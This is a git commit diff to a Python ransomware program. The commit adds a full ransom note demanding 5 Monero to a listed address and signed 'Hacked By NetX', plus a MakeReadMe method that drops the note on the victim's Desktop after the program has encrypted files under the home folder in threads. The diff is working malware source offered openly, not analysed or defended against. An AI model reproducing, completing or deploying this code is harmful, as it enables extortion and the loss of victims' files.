50a5da818992d7d7c2aa605e6225b68a312b3f09
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-07-01 20:58:05 +0200

    Update main.py

--- main.py
+++ main.py
@@ -6,16 +6,57 @@ import threading
 
 RansomWareNote = f"""
 
-  _____                             __          __            
- |  __ \\                            \\ \\        / /            
- | |__) |__ _ _ __  ___  ___  _ __ __\\ \\  /\\  / /_ _ _ __ ___ 
- |  _  // _` | '_ \\/ __|/ _ \\| '_ ` _ \\ \\/  \\/ / _` | '__/ _ \\
- | | \\ \\ (_| | | | \\__ \\ (_) | | | | | \\  /\\  / (_| | | |  __/
- |_|  \\_\\__,_|_| |_|___/\\___/|_| |_| |_|\\/  \\/ \\__,_|_|  \\___|
-                                                              
+
+           ,.         ,·´'; '                 _,.,  °             ,  . .,  °                           .,'    
+      ;'´*´ ,'\\       ,'  ';'\\°         ,.·'´  ,. ,  `;\\ '     ;'´    ,   ., _';\\'       ,.,           ,'´  ;\\    
+      ;    ';::\\      ;  ;::'\\       .´   ;´:::::\\`'´ \\'\\     \\:´¨¯:;'   `;::'\\:'\\      \\`, '`·.    ,·' ,·´\\::'\\  
+     ;      '\\;'      ;  ;:::;      /   ,'::\\::::::\\:::\\:'      \\::::;   ,'::_'\\;'       \\:';  '`·,'´,·´::::'\\:;'  
+    ,'  ,'`\\   \\      ;  ;:::;     ;   ;:;:-·'~^ª*';\'´            ,'  ,'::;'  ‘          `';'\\    ,':::::;·´     
+    ;  ;::;'\\  '\\    ;  ;:::;      ;  ,.-·:*'´¨'`*´\\::\\ '           ;  ;:::;  °            ,·´,   \\:;·´    '    
+   ;  ;:::;  '\\  '\\ ,'  ;:::;'     ;   ;\\::::::::::::'\\;'            ;  ;::;'  ‘         .·´ ,·´:\\   '\\           
+  ,' ,'::;'     '\\   ¨ ,'\\::;'      ;  ;'_\\_:;:: -·^*';\\            ;  ;::;'‚        ,·´  .;:::::'\\   ';    '     
+  ;.'\\::;        \\`*´\\::\\; °     ';    ,  ,. -·:*'´:\\:'\\°          ',.'\\::;'‚       ;    '.·'\\::::;'   ,'\\'        
+  \\:::\\'          '\\:::\\:' '        \\`*´ ¯\\:::::::::::\\;' '          \\::\\:;'‚       ;·-'´:::::\\·´ \\·:´:::\\       
+    \\:'             `*´'‚            \\:::::\\;::-·^*'´                \\;:'      ‘    \\::::;:·'     '\\;:·'´        
+                                      `*´¯                           °            `*'´           ‘           
+
+
+!!! YOUR IMPORTANT FILES ARE ENCRYPTED !!!
+
+
+Your Files Have Been Encrypted!
+All the files related to your movie have been encrypted with strong encryption algorithms. This includes scripts, footage, editing files, and other essential data. You will not be able to access these files or continue production without a special decryption key.
+
+
+What Happened to My Files?
+Your important files are encrypted, which means you cannot access them anymore until they are decrypted. The only way to decrypt your files is to purchase the decryption key from us.
+
+
+How Can I Recover My Files?
+To recover your files, you need to send 5 Monero (XMR) to the following address:
+
+
+Monero Address:
+47dYu3ijR4K5etcyKPCt5fE9M5T6epkdKXRJtHWt8RxwVQgVcwejTzV2z7C8pkyB7F3XMaVAaL1Y7XXtmVXhJwB16xhwo26
+
+
+How Do I Pay?
+Purchase Monero from any cryptocurrency exchange or platform.
+Send 5 Monero to the address above.
+
+
+Important:
+There is no deadline for payment, but the sooner you pay, the sooner you will regain access to your files.
+Do not attempt to decrypt your files using third-party tools. This may result in permanent data loss.
+If you try to remove or tamper with this software, your files will remain permanently encrypted.
+We understand the importance of your data and are here to help you recover it as quickly as possible. Ensure to follow the instructions carefully to regain access to your files.
+
+
+
+Hacked By NetX
 """
 
-print(RansomWareNote)
+# print(RansomWareNote)
 
 TargetFiles = [
     '.pdf',
@@ -330,6 +371,14 @@ class RansomWare:
             pass
         self.many -= 1
 
+    def MakeReadMe(self):
+        user_folder = os.path.expanduser("~")
+        file_path = f"{user_folder}\\Desktop\\README.txt"
+        
+        r = open(file_path, "w")
+        r.write(RansomWareNote)
+        r.close()
+
     def startEncrypting(self):
         user_folder = os.path.expanduser("~")
         # print(user_folder)
@@ -352,7 +401,8 @@ class RansomWare:
                             print(full_path)
                             while (self.many > 20): pass
                             threading.Thread(target=lambda: self.threading_e(full_path)).start()
-                            
+        
+        self.MakeReadMe()
 
     def startDecrypting(self):
         user_folder = os.path.expanduser("~")
